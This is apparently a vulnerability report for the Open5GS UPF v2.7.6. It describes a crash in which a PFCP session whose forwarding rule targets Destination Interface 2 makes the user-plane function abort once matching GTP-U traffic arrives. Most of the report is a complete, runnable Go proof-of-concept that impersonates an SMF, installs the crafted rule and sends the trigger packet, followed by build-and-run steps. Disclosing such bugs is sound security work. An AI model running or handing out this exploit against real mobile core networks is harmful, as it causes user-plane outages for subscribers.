### Open5GS Release, Revision, or Tag

v2.7.6



### Description
Open5GS UPF v2.7.6 accepts a PFCP Session Establishment Request that installs a forwarding rule (FAR) whose Forwarding Parameters → Destination Interface is set to 2 (SGi-LAN / N6-LAN). However, the UPF GTP-U receive path (src/upf/gtp-path.c, _gtpv1_u_recv_cb) does not implement handling for DestinationInterface=2.
As a result, once any subsequent GTP-U packet matches the installed PDR and triggers the FAR forwarding path, the UPF reaches an unimplemented branch and terminates the process via a fatal assertion/abort, causing a user-plane denial of service (DoS).

### Steps to reproduce
1. Start a new go project inside a new folder: `go mod init poc`
2. Create a `main.go` and paste the code below:
```
package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"strconv"
	"sync"
	"time"

	"github.com/wmnsk/go-pfcp/ie"
	"github.com/wmnsk/go-pfcp/message"
)

func main() {
	var (
		upfAddr          = flag.String("upf", "10.100.200.2:8805", "UPF PFCP address")
		nodeID           = flag.String("nodeid", "10.100.200.1", "Fake SMF NodeID (IPv4/FQDN)")
		localIP          = flag.String("laddr", "", "Optional local IP to bind PFCP socket")
		ulTEID           = flag.Uint("teid", 0x12345678, "UL TEID to install in PDR")
		upfN3IP          = flag.String("n3ip", "10.100.200.2", "UPF N3 IPv4 (for F-TEID in PDI)")
		ueIP             = flag.String("ueip", "10.60.0.10", "Dummy UE IPv4")
		boottime         = time.Now()
		seq       uint32 = 0
		gtpuN3           = flag.String("gtpu", "", "Optional UPF GTP-U endpoint host:port for PFCP-in-GTP-U test")
		gtpuTEID         = flag.Uint("gtpu-teid", 0, "TEID for PFCP-in-GTP-U (defaults to -teid)")
		n3Port           = flag.Uint("n3port", 2152, "UPF N3 GTP-U port for trigger traffic")
		innerDst         = flag.String("inner-dstip", "8.8.8.8", "Inner IPv4 destination for trigger GTP-U packet")
		innerPort        = flag.Uint("inner-dstport", 80, "Inner UDP destination port for trigger GTP-U packet")
	)
	flag.Parse()

	var (
		conn  *net.UDPConn
		raddr *net.UDPAddr
		err   error
	)
	if *gtpuN3 == "" {
		raddr, err = net.ResolveUDPAddr("udp4", *upfAddr)
		if err != nil {
			log.Fatalf("resolve upf addr: %v", err)
		}
		var laddr *net.UDPAddr
		if *localIP != "" {
			laddr, err = net.ResolveUDPAddr("udp4", net.JoinHostPort(*localIP, "0"))
			if err != nil {
				log.Fatalf("resolve local addr: %v", err)
			}
		}
		conn, err = net.DialUDP("udp4", laddr, raddr)
		if err != nil {
			log.Fatalf("dial upf: %v", err)
		}
		defer conn.Close()
	}

	// heartbeat handler for Open5GS: reply Heartbeat Request to keep association alive.
	var wg sync.WaitGroup
	stopCh := make(chan struct{})
	asRspCh := make(chan *message.AssociationSetupResponse, 1)
	seRspCh := make(chan *message.SessionEstablishmentResponse, 1)
	errCh := make(chan error, 1)
	if *gtpuN3 == "" {
		wg.Add(1)
		go func() {
			defer wg.Done()
			buf := make([]byte, 2048)
			for {
				_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
				n, _, err := conn.ReadFrom(buf)
				if err != nil {
					select {
					case <-stopCh:
						return
					default:
					}
					continue
				}
				msg, err := message.Parse(buf[:n])
				if err != nil {
					log.Printf("ignored undecodable message: %v", err)
					continue
				}
				switch m := msg.(type) {
				case *message.HeartbeatRequest:
					seq := m.Header.SequenceNumber
					hbRsp, err := message.NewHeartbeatResponse(
						seq,
						ie.NewRecoveryTimeStamp(boottime),
					).Marshal()
					if err != nil {
						log.Printf("heartbeat marshal err: %v", err)
						continue
					}
					if _, err := conn.Write(hbRsp); err != nil {
						log.Printf("heartbeat send err: %v", err)
					} else {
						log.Printf("sent Heartbeat Response (seq=%d)", seq)
					}
				case *message.AssociationSetupResponse:
					seq := m.Header.SequenceNumber
					log.Printf("got AssociationSetupResponse (seq=%d)", seq)
					select {
					case asRspCh <- m:
					default:
					}
				case *message.SessionEstablishmentResponse:
					seq := m.Header.SequenceNumber
					log.Printf("got SessionEstablishmentResponse (seq=%d)", seq)
					select {
					case seRspCh <- m:
					default:
					}
				default:
					log.Printf("got %s", msg.MessageTypeName())
				}
			}
		}()
	}

	if *gtpuN3 == "" {
		// PFCP over N4
		seq++
		asReq, err := message.NewAssociationSetupRequest(
			seq,
			ie.NewNodeID(*nodeID, "", ""),
			ie.NewRecoveryTimeStamp(boottime),
		).Marshal()
		if err != nil {
			log.Fatalf("marshal assoc setup: %v", err)
		}
		if _, err := conn.Write(asReq); err != nil {
			log.Fatalf("send assoc setup: %v", err)
		}
		log.Printf("sent PFCP Association Setup Request to %s", raddr)

		select {
		case rsp := <-asRspCh:
			if rsp.Cause != nil {
				if cause, _ := rsp.Cause.Cause(); cause != ie.CauseRequestAccepted {
					log.Fatalf("assoc rejected, cause=%d", cause)
				}
			}
			log.Printf("association accepted")
		case <-time.After(5 * time.Second):
			errCh <- errTimeout("assoc")
		}
	}

	// 2) Session Establishment with one UL PDR/FAR
	seq++
	createPDR := ie.NewCreatePDR(
		ie.NewPDRID(1),
		ie.NewPrecedence(10),
		ie.NewPDI(
			ie.NewSourceInterface(ie.SrcInterfaceAccess),
			// UL F-TEID on the GTP-U termination (N3) of the UPF.
			ie.NewFTEID(0x01, uint32(*ulTEID), net.ParseIP(*upfN3IP), nil, 0), // flag 0x01 = IPv4 present
			ie.NewUEIPAddress(0x02, *ueIP, "", 0, 0),                          // flag 0x02 = UE IPv4
		),
		ie.NewOuterHeaderRemoval(0x00, 0x00), // remove outer GTP-U/UDP/IP
		ie.NewFARID(1),
	)

	createFAR := ie.NewCreateFAR(
		ie.NewFARID(1),
		ie.NewApplyAction(0x02), // FORW
		ie.NewForwardingParameters(
			ie.NewDestinationInterface(ie.DstInterfaceSGiLANN6LAN),
		),
	)

	seq++
	sessReq, err := message.NewSessionEstablishmentRequest(
		0,   // MP
		0,   // FO
		0,   // SEID
		seq, // Seq
		0,   // Pri
		ie.NewNodeID(*nodeID, "", ""),
		ie.NewFSEID(1, net.ParseIP(*nodeID), nil),
		ie.NewPDNType(ie.PDNTypeIPv4),
		createPDR,
		createFAR,
	).Marshal()
	if err != nil {
		log.Fatalf("marshal sess est: %v", err)
	}

	triggerDst := *gtpuN3
	if triggerDst == "" {
		triggerDst = net.JoinHostPort(*upfN3IP, strconv.Itoa(int(*n3Port)))
	}

	if *gtpuN3 != "" {
		// PFCP-in-GTP-U path
		dstHost, dstPort := splitHostPortDefault(*upfAddr, 8805)
		dstIP := net.ParseIP(dstHost)
		if dstIP == nil {
			log.Fatalf("invalid PFCP dst IP: %s", dstHost)
		}
		srcIP := net.ParseIP(*nodeID)
		if srcIP == nil {
			log.Fatalf("invalid nodeid ip: %s", *nodeID)
		}
		srcPort := uint16(30000 + rand.Intn(20000))
		inner := buildInnerIPv4UDP(srcIP, dstIP, srcPort, uint16(dstPort), sessReq)
		teid := uint32(*ulTEID)
		if *gtpuTEID != 0 {
			teid = uint32(*gtpuTEID)
		}
		gtp := buildGTPU(teid, inner)
		n3addr, err := net.ResolveUDPAddr("udp", *gtpuN3)
		if err != nil {
			log.Fatalf("resolve gtpu n3: %v", err)
		}
		gconn, err := net.DialUDP("udp", nil, n3addr)
		if err != nil {
			log.Fatalf("dial gtpu: %v", err)
		}
		defer gconn.Close()
		if _, err := gconn.Write(gtp); err != nil {
			log.Fatalf("send gtpu: %v", err)
		}
		log.Printf("sent PFCP Session Establishment (len=%d) via GTP-U to %s TEID=0x%x", len(sessReq), *gtpuN3, teid)

		if err := sendTriggerGTPUPacket(triggerDst, teid, *ueIP, *innerDst, uint16(*innerPort)); err != nil {
			log.Fatalf("send trigger gtp-u: %v", err)
		}
	} else {
		if _, err := conn.Write(sessReq); err != nil {
			log.Fatalf("send sess est: %v", err)
		}
		log.Printf("sent Session Establishment Request (TEID=0x%x, UEIP=%s)", *ulTEID, *ueIP)

		sessionAccepted := false
		select {
		case rsp := <-seRspCh:
			if rsp.Cause != nil {
				if cause, _ := rsp.Cause.Cause(); cause != ie.CauseRequestAccepted {
					log.Printf("session rejected, cause=%d (still sending trigger GTP-U)", cause)
				} else {
					sessionAccepted = true
				}
			}
			if sessionAccepted {
				log.Printf("session accepted; UL TEID 0x%x installed on UPF", *ulTEID)
			}
		case <-time.After(5 * time.Second):
			log.Printf("session response timeout (still sending trigger GTP-U)")
		}

		if err := sendTriggerGTPUPacket(triggerDst, uint32(*ulTEID), *ueIP, *innerDst, uint16(*innerPort)); err != nil {
			log.Fatalf("send trigger gtp-u: %v", err)
		}

		close(stopCh)
		wg.Wait()
	}
}

type timeoutErr string

func (t timeoutErr) Error() string { return string(t) }

func errTimeout(stage string) error {
	return timeoutErr(stage + " timeout")
}

func sendTriggerGTPUPacket(dst string, teid uint32, ueIP, innerDst string, innerDstPort uint16) error {
	raddr, err := net.ResolveUDPAddr("udp", dst)
	if err != nil {
		return fmt.Errorf("resolve N3 addr %s: %w", dst, err)
	}

	conn, err := net.DialUDP("udp", nil, raddr)
	if err != nil {
		return fmt.Errorf("dial N3 %s: %w", dst, err)
	}
	defer conn.Close()

	srcIP := net.ParseIP(ueIP)
	if srcIP == nil {
		return fmt.Errorf("invalid UE IPv4: %s", ueIP)
	}
	dstIP := net.ParseIP(innerDst)
	if dstIP == nil {
		return fmt.Errorf("invalid inner destination IPv4: %s", innerDst)
	}

	srcPort := uint16(20000 + rand.Intn(20000))
	payload := []byte("pfcp-fake-smf trigger")

	inner := buildInnerIPv4UDP(srcIP, dstIP, srcPort, innerDstPort, payload)
	gtp := buildGTPU(teid, inner)

	if _, err := conn.Write(gtp); err != nil {
		return fmt.Errorf("send gtp-u to %s: %w", dst, err)
	}

	log.Printf("sent trigger GTP-U packet to %s (TEID=0x%x, inner %s:%d -> %s:%d, payload=%d bytes)", dst, teid, srcIP, srcPort, dstIP, innerDstPort, len(payload))
	return nil
}

// helpers for PFCP-in-GTP-U
func splitHostPortDefault(addr string, defPort int) (string, int) {
	host, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		// if missing port, assume defPort
		return addr, defPort
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return host, defPort
	}
	return host, port
}

func csum(data []byte) uint16 {
	sum := uint32(0)
	for len(data) > 1 {
		sum += uint32(binary.BigEndian.Uint16(data))
		data = data[2:]
	}
	if len(data) > 0 {
		sum += uint32(data[0]) << 8
	}
	for (sum >> 16) > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

func buildInnerIPv4UDP(srcIP, dstIP net.IP, srcPort, dstPort uint16, payload []byte) []byte {
	src := srcIP.To4()
	dst := dstIP.To4()
	if src == nil || dst == nil {
		log.Fatalf("only IPv4 supported for inner packet")
	}
	udpLen := 8 + len(payload)
	ipLen := 20 + udpLen

	ip := make([]byte, 20)
	ip[0] = 0x45
	binary.BigEndian.PutUint16(ip[2:], uint16(ipLen))
	binary.BigEndian.PutUint16(ip[4:], uint16(rand.Intn(0xffff)))
	ip[6] = 0x40
	ip[8] = 64
	ip[9] = 17
	copy(ip[12:], src)
	copy(ip[16:], dst)
	binary.BigEndian.PutUint16(ip[10:], csum(ip))

	udp := make([]byte, 8)
	binary.BigEndian.PutUint16(udp[0:], srcPort)
	binary.BigEndian.PutUint16(udp[2:], dstPort)
	binary.BigEndian.PutUint16(udp[4:], uint16(udpLen))
	psh := make([]byte, 12)
	copy(psh[0:], src)
	copy(psh[4:], dst)
	psh[9] = 17
	binary.BigEndian.PutUint16(psh[10:], uint16(udpLen))
	udpChkData := append(append(psh, udp...), payload...)
	binary.BigEndian.PutUint16(udp[6:], csum(udpChkData))

	pkt := make([]byte, 0, ipLen)
	pkt = append(pkt, ip...)
	pkt = append(pkt, udp...)
	pkt = append(pkt, payload...)
	return pkt
}

func buildGTPU(teid uint32, inner []byte) []byte {
	gtp := make([]byte, 8+len(inner))
	gtp[0] = 0x30
	gtp[1] = 0xFF // T-PDU
	binary.BigEndian.PutUint16(gtp[2:], uint16(len(inner)))
	binary.BigEndian.PutUint32(gtp[4:], teid)
	copy(gtp[8:], inner)
	return gtp
}
```
3. Download required libraries: go mod tidy
4. Run the program with the upf pfcp server address: `go run ./main.go -upf 10.33.33.3:8805 -nodeid 10.33.33.4 -n3ip 10.33.33.3 -teid 0x12345678`



